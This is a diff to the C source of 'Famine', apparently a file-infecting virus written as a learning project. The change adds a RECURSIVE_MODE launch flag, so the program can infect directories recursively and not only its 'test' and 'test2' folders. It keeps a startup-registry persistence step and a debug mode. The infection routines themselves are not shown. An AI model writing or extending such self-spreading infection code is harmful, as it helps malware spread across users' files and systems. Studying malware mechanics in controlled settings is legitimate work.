@@ -41,15 +41,18 @@ static char			*get_temporary_folder()
 
 
 /*
-** Check if the program is launched with DEBUG_MODE
+** Check if the program is launched with DEBUG_MODE or RECURSIVE_MODE
 */
-static void			check_debug_mode(t_famine *famine, int argc, char **argv)
+static void			check_launch_mode(t_famine *famine, int argc, char **argv)
 {
 	if (argc > 1) {
 		int i = 1;
 		while (argv[i]) {
 			if (!ft_strcmp(argv[i], DEBUG_MODE)) {
 				famine->debug = true;
+			}
+			else if (!ft_strcmp(argv[i], RECURSIVE_MODE)) {
+				famine->recursive = true;
 			}
 			i++;
 		}
@@ -68,13 +71,15 @@ static t_famine		*alloc_famine(int argc, char **argv)
 	allocated->path = get_temporary_folder();
 	allocated->debug = false;
 	allocated->executable_path = argv[0];
+	allocated->recursive = false;
+	allocated->recursive_path = NULL;
 	return (allocated);
 }
 
 /*
 ** Infect folders
 */
-void				infect_folders(t_famine *famine)
+static void			infect_test_folders(t_famine *famine)
 {
 	infect_folder(famine, "test");
 	infect_folder(famine, "test2");
@@ -88,14 +93,15 @@ void				init_famine(int argc, char **argv)
 	t_famine		*famine = alloc_famine(argc, argv);
 	if (famine->path != NULL)
 	{
-		check_debug_mode(famine, argc, argv);
+		check_launch_mode(famine, argc, argv);
 		if (famine->debug == true) {
 			start_debug_console();
 		}
-
 		startup_registery(famine);
-		infect_folders(famine);
-
+		if (famine->recursive) {
+			infect_recursively(famine);
+		} else
+			infect_test_folders(famine);
 		print_message(famine, "\nFamine job's done !", false);
 		if (famine->debug == true) {
 			while (true) ;
